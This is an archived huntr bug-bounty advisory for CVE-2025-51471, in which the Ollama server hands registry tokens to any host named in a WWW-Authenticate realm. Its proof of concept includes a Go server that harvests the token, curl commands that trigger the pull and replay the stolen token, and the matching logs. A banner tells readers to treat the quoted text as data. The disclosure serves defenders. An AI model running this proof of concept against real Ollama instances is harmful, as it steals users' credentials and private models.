---
type: Article
title: "huntr - The world's first bug bounty platform for AI/ML"
description: "Advisory for CVE-2025-51471 describing credential theft from Ollama through an unvalidated WWW-Authenticate realm. A malicious endpoint can redirect the client's authentication flow so that a registry token is disclosed to an attacker-controlled server."
resource: "https://huntr.com/bounties/94eea285-fd65-4e01-a035-f533575ebdc2"
tags: [article, webseclist-reference, en, huntr-com, credential-theft, auth-bypass, redirect, ai, cve, owasp-a01-2021]
generated:
  by: webseclist-refs/1
  at: "2026-10-02T14:12:02+00:00"
status: stable
stale_after: 2027-10-02
sources:
  - id: original
    resource: "https://huntr.com/bounties/94eea285-fd65-4e01-a035-f533575ebdc2"
    title: "huntr - The world's first bug bounty platform for AI/ML"
    author: Mohammed Benhelli, Patrick Ventuzelo
also_at: []
authors:
  - Mohammed Benhelli
  - Patrick Ventuzelo
canonical_url: ""
cited_by:
  - "2025.md:146"
commit: ""
content_sha256: 8282a1c5e4f1dca6166ef0b3b73779b0b9b779f7730975c6340a7c2ae15504f9
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://huntr.com/bounties/94eea285-fd65-4e01-a035-f533575ebdc2"
published: ""
publisher: huntr.com
publisher_english: ""
raw_sha256: c7a89622e74d46270919b6b04220f89d2d015ec0c343e8be2884d12241c9ed84
retrieved_from: "https://huntr.com/bounties/94eea285-fd65-4e01-a035-f533575ebdc2"
retrieved_kind: browser
retrieved_utc: "2026-10-02T14:12:02+00:00"
slug: huntr-com-huntr-world-s-first-bug-bounty-platform-ai-ml
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# huntr - The world's first bug bounty platform for AI/ML

**huntr - The world's first bug bounty platform for AI/ML** - Mohammed Benhelli, Patrick Ventuzelo, huntr.com.

- Published: date not stated
- Original: <https://huntr.com/bounties/94eea285-fd65-4e01-a035-f533575ebdc2>
- Preserved from: https://huntr.com/bounties/94eea285-fd65-4e01-a035-f533575ebdc2 (browser) on 2026-10-02
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Ollama server authentication flow is vulnerable to token stealing in [ollama/ollama](https://github.com/ollama/ollama)

Pending

Reported on Dec 24th 2024

---

# Ollama server authentication flow is vulnerable to token stealing

**Credits**

- Mohammed Benhelli [@Fuzzinglabs](https://github.com/FuzzingLabs/)
- Patrick Ventuzelo [@Fuzzinglabs](https://github.com/FuzzingLabs/)

**Date:** 24/12/2024

### **Executive summary**

We discovered a vulnerability in the `ollama` server that can be triggered when a malicious API server responds to a request with a `WWW-Authenticate` header.

### **Impact**

An attacker can exploit this vulnerability, which can lead to `Access Token Stealing`.

### Vulnerability Details

- **Severity:** `Critical`
- **Vulnerability Type:** `Access Token Stealing`
- **Vulnerable Component:**

- `server/auth.go`

## Environment

- **Distro Version:** `Ubuntu 22.04.4 LTS`
- **Additional Environment Details:** `go version go1.22.5 linux/amd64`

## Steps to Reproduce

To demonstrate the issue, we provide a Proof of Concept (POC) to show that the bug can be triggered with the latest release of `ollama`.

- Clone and build the latest version of `ollama`:

```sh
git clone https://github.com/ollama/ollama
cd ollama
git checkout 2ddc32d5c5386b28062a46ac6cfea5160cd9f600

```

- Run an ollama server with the following commands:

```sh
cd llama
make -j 5
cd ..
go run main.go server

```

- Create a `main.go` file with the following content:

```go
package main

import (
    "fmt"
    "log"
    "net/http"
)

func main() {
    http.HandleFunc("/", handleRequest)
    log.Fatal(http.ListenAndServe(":8000", nil))
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
    fmt.Printf("Request: %s %s\n", r.Method, r.URL.String())
    if r.Header.Get("Authorization") == "" {
        w.Header().Set("WWW-Authenticate", `Bearer realm="https://registry.ollama.ai/v2/token",service="ollama",scope="-"`)
        w.WriteHeader(http.StatusUnauthorized)
        if _, err := w.Write([]byte("Unauthorized")); err != nil {
            return
        }
        return
    }
    fmt.Printf("Authorization: %s\n", r.Header.Get("Authorization"))
    w.WriteHeader(http.StatusTeapot)
    if _, err := w.Write([]byte("Goeland")); err != nil {
        return
    }
}

```

- Run the server with the following command:

```sh
go run main.go

```

- Run the following command to trigger the vulnerability (The `insecure` flag is used for TLS handshake and not URL validation):

```sh
curl http://localhost:11434/api/pull -d '{
  "model": "http://127.0.0.1:8000/paella/goeland:0.5b",
  "insecure": true
}'

```

- Copy the `Authorization` token from the server output and try if it's valid against one of you private model for example:

```sh
curl "https://registry.ollama.ai/v2/paella/mario/manifests/latest" -v -H "Authorization: Bearer aHR0cHM6Ly9yZW...dpc3RyeS5xhbWE"

```

## Detailed Behavior

### Ollama output

```sh
...
time=2024-12-24T12:55:50.784Z level=WARN source=images.go:860 msg="pulling model with bad existing manifest" name=127.0.0.1:8000/paella/goeland:0.5b error="open C:\\Users\\bill_\\.ollama\\models\\manifests\\127.0.0.1:8000\\paella\\goeland\\0.5b: The filename, directory name, or volume label syntax is incorrect."
[GIN] 2024/12/24 - 12:55:50 | 200 |    214.8201ms |       127.0.0.1 | POST     "/api/pull"
...

```

### Main server output

```sh
...
Request: GET /v2/paella/goeland/manifests/0.5b
Request: GET /v2/paella/goeland/manifests/0.5b
Authorization: Bearer aHR0cHM6Ly9yZWdpc3RyeS5vbGxhbWEuYWkvd...
...

```

### Request response

```sh
HTTP/1.1 200 OK
Content-Type: application/x-ndjson
Date: Tue, 24 Dec 2024 12:55:50 GMT
Transfer-Encoding: chunked

{"status":"pulling manifest"}
{"error":"pull model manifest: 418: Goeland"}

```

## Root Cause Analysis

The root cause of the vulnerability is located in the `server/auth.go` file. The `getAuthorizationToken` function does not validate that the server asking for the token is on the same domain as ollama registry.

```go
package server
...
func getAuthorizationToken(ctx context.Context, challenge registryChallenge) (string, error) {
    redirectURL, err := challenge.URL()
    if err != nil {
        return "", err
    }

    sha256sum := sha256.Sum256(nil)
    data := []byte(fmt.Sprintf("%s,%s,%s", http.MethodGet, redirectURL.String(), base64.StdEncoding.EncodeToString([]byte(hex.EncodeToString(sha256sum[:])))))

    headers := make(http.Header)
    signature, err := auth.Sign(ctx, data)
    if err != nil {
        return "", err
    }

    headers.Add("Authorization", signature)

    response, err := makeRequest(ctx, http.MethodGet, redirectURL, headers, nil, ®istryOptions{})
    if err != nil {
        return "", err
    }
    defer response.Body.Close()

    body, err := io.ReadAll(response.Body)
    if err != nil {
        return "", fmt.Errorf("%d: %v", response.StatusCode, err)
    }

    if response.StatusCode >= http.StatusBadRequest {
        if len(body) > 0 {
            return "", fmt.Errorf("%d: %s", response.StatusCode, body)
        } else {
            return "", fmt.Errorf("%d", response.StatusCode)
        }
    }

    var token api.TokenResponse
    if err := json.Unmarshal(body, &token); err != nil {
        return "", err
    }

    return token.Token, nil
}

```

## Recommendations

- Implement a check to prevent access token forgery for another realm.

# Impact

### **Impact**

An attacker can exploit this vulnerability, which can lead to `Access Token Stealing`.

### Vulnerability Details

- **Severity:** `Critical`
- **Vulnerability Type:** `Access Token Stealing`
- **Vulnerable Component:**

- `server/auth.go`

# Occurrences

[![file](https://huntr.com/extensions/file.svg?dpl=dpl_ZUQHq3oqKmbPA22GmJADSbuTvREH)

auth.go L53

](https://github.com/ollama/ollama/blob/2ddc32d5c5386b28062a46ac6cfea5160cd9f600/server/auth.go#L53)

Sign in to join this conversation

Vulnerability Type

[CWE-922: Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html)

Severity

Critical (9.1)

Attack vectorNetwork

Attack complexityLow

Privileges requiredNone

User interactionNone

ScopeUnchanged

ConfidentialityHigh

IntegrityHigh

AvailabilityNone

[Open in visual CVSS calculator ](https://cvss.js.org/#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

Registry
Golang

Affected Version

2ddc32d5c5386b28062a46ac6cfea5160cd9f600

Visibility
Public

Status
Awaiting review

Disclosure Bounty
$1500

Fix Bounty
$375

Found by

![User avatar](https://huntr.com/_next/image?url=https%3A%2F%2Fgithub.com%2Fpventuzelo.png&w=256&q=75)

[Patrick Ventuzelo](https://huntr.com/users/pventuzelo)

@pventuzelo

LIGHTWEIGHT
